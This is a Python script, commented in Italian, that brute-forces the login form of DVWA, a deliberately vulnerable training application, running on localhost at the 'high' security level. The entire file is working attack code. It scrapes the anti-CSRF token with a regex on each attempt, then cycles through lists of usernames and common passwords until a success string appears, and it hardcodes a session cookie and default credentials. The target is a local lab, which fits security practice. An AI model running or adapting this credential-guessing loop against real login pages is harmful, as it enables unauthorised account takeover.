import requests
import re

# URL della pagina di login di DVWA
dvwa_url = "http://127.0.0.1:42001/vulnerabilities/brute/"
dvwa_login_url = "http://127.0.0.1:42001/login.php"

# Credenziali di test
username_list = ["admin", "user"]
password_list = ["123456", "admin", "letmein", "password", "password1"]

# Cookie di sessione DVWA
session_cookie = {"PHPSESSID": "il9kueveb76l5uba0ubvd5tib6", "security": "high"}

success_string = "Welcome to the password protected area admin"

# Inizializzo una sessione di requests per mantenere i cookie
session = requests.Session()

# Codici di colore ANSI
RESET = "\033[0m"       # Resetta il colore
RED = "\033[91m"        # Rosso per tentativi falliti
GREEN = "\033[92m"      # Verde per tentativi di successo

# Step 1: Effettua il login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}
login_response = session.post(dvwa_login_url, data=login_data, cookies=session_cookie)

for username in username_list:
    for password in password_list:
        try:
            #Recuperiamo la pagina del form per ottenere il token CSRF
            response = session.get(dvwa_url, cookies=session_cookie, timeout=10)

            # Debug: Stampa l'HTML della risposta
            print("HTML ricevuto:")

            # Usiamo una regex per trovare il valore del token CSRF
            csrf_token_match = re.search(r"name='user_token' value='([a-zA-Z0-9]+)'", response.text)

            if not csrf_token_match:
                print("Impossibile trovare il token CSRF nella risposta. Controlla il codice HTML.")
                break

            csrf_token = csrf_token_match.group(1)
            print(f"Token CSRF trovato: {csrf_token}")

            #Inviamo la richiesta GET con il token, username e password
            params = {
                "username": username,
                "password": password,
                "Login": "Login",
                "user_token": csrf_token
            }

            response = session.get(dvwa_url, params=params, cookies=session_cookie, timeout=10)

            if success_string in response.text:
                print(f"{GREEN}Accesso riuscito! Username: {username}, Password: {password}{RESET}")
                break
            else:
                print(f"{RED}Tentativo fallito - Username: {username}, Password: {password}{RESET}")

        except requests.exceptions.RequestException as e:
            print(f"Errore nella richiesta per Username: {username}, Password: {password} - {e}")
